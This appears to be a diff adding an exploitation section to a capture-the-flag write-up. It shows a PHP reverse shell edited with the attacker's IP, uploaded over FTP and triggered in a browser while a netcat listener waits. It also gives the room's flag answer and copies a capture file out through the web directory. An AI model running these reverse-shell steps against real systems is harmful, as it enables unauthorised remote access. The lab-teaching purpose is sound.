@@ -81,13 +81,51 @@ it's the interface of ftp
 
 ## Exploitation
 
+prepare a web shell and change to your ip
+
+```
+cp /usr/share/webshells/php/php-reverse-shell.php reverse.php
+vi reverse.php
+```
+
 let's go back to fpt and upload our shell
 
 ```
-put shell.php
+cd ftp
+put reverse.php
 ```
 
+![image](https://user-images.githubusercontent.com/90561566/202400688-dac15d49-fa39-445e-8be5-076656d4642c.png)
 
+now we can see our shell here
+
+![image](https://user-images.githubusercontent.com/90561566/202400761-176a6a53-185d-48b3-9fd8-a9359dd4cb08.png)
+
+create listener and open file on browser
+
+```
+nc -vlnp 1234
+```
+
+![image](https://user-images.githubusercontent.com/90561566/202403261-dc874bcd-546b-431a-9da8-364ccfa5054a.png)
+
+and the secret spicy soup recipe is `love`
+
+![image](https://user-images.githubusercontent.com/90561566/202403567-a10149c0-fd42-41fa-923f-f4856d35d437.png)
+
+let's see what in 2 suspicious folders here
+
+![image](https://user-images.githubusercontent.com/90561566/202404109-b7fc3f73-c656-4fb9-adb5-9037b217f2b1.png)
+
+hmm, a pcapng file, i will take it back to research
+
+```
+cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
+```
+
+![image](https://user-images.githubusercontent.com/90561566/202405450-17aa3512-4d2e-4c2e-90f1-f0a7f801dd0e.png)
+
+## Cracking
 
 
 
